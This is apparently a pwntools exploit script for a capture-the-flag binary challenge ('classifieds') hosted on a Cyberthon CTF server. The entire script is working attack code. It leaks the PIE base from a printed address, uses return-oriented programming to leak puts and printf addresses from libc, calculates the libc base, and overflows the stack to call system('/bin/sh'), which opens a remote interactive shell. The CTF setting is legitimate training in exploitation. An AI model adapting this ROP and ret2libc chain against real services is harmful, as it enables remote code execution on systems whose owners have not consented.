from pwn import *
context.log_level='debug'

### DECLARE ###
BINARY = "./classifieds"
URL = "chals.cyberthon22f.ctf.sg"
PORT = 10301
RIP_OFFSET = 120
PROMPT = "Enter advertisement => "
ID_MARKER = "CUSTOMER#"

elf = context.binary = ELF(BINARY)

p = remote(URL, PORT)

### script 1, collecting the pie base ###
p.recvuntil(ID_MARKER)
id_addr = int(p.recvline())
log.info("address of customer id is " + hex(id_addr))
elf.address = id_addr - elf.symbols.CUSTOMER_ID #pwntools handles the base wrangling
log.success("pie base is " + hex(elf.address))

### script 2, leaking libc ###
rop = ROP(elf) # only declare after the elf base found
rop.puts(elf.got.puts) # faster way of calling puts without manually setting rdi first
rop.main()
p.sendlineafter(PROMPT, flat({RIP_OFFSET:rop.chain()}))

p.recvline()
puts_libc = u64(p.recvline().strip().ljust(8, b"\x00"))

rop = ROP(elf) # only declare after the elf base found
rop.puts(elf.got.printf) # faster way of calling puts without manually setting rdi first
rop.main()
p.sendlineafter(PROMPT, flat({RIP_OFFSET:rop.chain()}))

p.recvline()
printf_libc = u64(p.recvline().strip().ljust(8, b"\x00"))

log.success("libc puts is " + hex(puts_libc))
log.success("libc printf is " + hex(printf_libc))

### script 3, confirming libc and sending syscall ###
libc = ELF("/home/absurdtiger/tools/libc6_2.33-0ubuntu5_amd64.so")

libc.address = puts_libc - libc.symbols.puts
log.success("libc base is " + hex(libc.address))

rop = ROP([elf, libc])
rop.system(next(libc.search(b"/bin/sh"))) # spent ages debugging just to get this syscall working

p.sendlineafter(PROMPT, flat(
	"A"*RIP_OFFSET,
	rop.ret.address,
	rop.chain()
))

p.interactive()
